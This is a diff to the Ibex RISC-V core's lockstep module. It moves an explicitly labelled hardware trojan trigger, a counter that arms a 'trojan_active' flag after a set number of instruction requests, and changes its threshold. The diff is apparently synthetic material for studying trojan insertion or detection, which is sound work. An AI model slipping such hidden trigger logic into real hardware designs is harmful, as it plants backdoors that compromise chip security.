@@ -116,24 +116,6 @@ module ibex_lockstep import ibex_pkg::*; #(
   input  logic                         scan_rst_ni
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 17807;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (instr_req_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
   localparam int unsigned LockstepOffsetW = $clog2(LockstepOffset);
   // Core outputs are delayed for an extra cycle due to shadow output registers
   localparam int unsigned OutputsOffset = LockstepOffset + 1;
@@ -173,6 +155,23 @@ module ibex_lockstep import ibex_pkg::*; #(
     .cnt_after_commit_o (                       ),
     .err_o              (rst_shadow_cnt_err     )
   );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=11873)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 11873;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (instr_req_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
   // When the LockstepOffset counter value is reached, activate the lockstep
   // comparison. We do not explicitly check whether rst_shadow_set_q forms a valid
